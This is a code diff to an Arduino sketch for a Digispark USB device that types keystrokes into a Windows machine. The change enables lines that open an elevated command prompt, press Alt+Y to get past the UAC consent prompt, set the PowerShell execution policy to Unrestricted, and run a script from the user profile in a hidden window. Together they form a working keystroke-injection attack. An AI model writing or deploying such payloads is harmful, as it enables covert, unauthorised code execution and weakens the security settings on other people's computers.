@@ -18,15 +18,15 @@ void loop() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
   DigiKeyboard.delay(750);
-  //If the system hasn't been configured to run scripts, uncomment the lines bellow
-  //DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
-  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  //DigiKeyboard.delay(750);
-  //DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
-  //DigiKeyboard.delay(750);
-  //DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
-  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  //DigiKeyboard.delay(750);
+  //If the system has been configured to run scripts, comment the lines bellow
+  DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(750);
   DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for (;;) {
